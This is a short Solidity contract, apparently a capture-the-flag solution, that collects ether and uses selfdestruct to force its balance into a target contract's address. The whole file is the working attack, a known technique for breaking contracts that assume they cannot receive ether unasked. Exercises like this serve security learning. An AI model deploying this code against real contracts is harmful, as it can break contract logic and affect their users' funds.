// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import '@openzeppelin/contracts/access/Ownable.sol';

contract ForceAttacker is Ownable {/*

                       MEOWWWWW!!
             /\_/\   /
        ____/ X X \
      /~____  =O= /
     (______)__m_m)

    */

    address private forceAddress;

    constructor(address _forceAddress) {
        forceAddress = _forceAddress;
    }

    function deposit() external payable {} 

    function destroy() external onlyOwner {
        selfdestruct(payable(forceAddress));
    }

}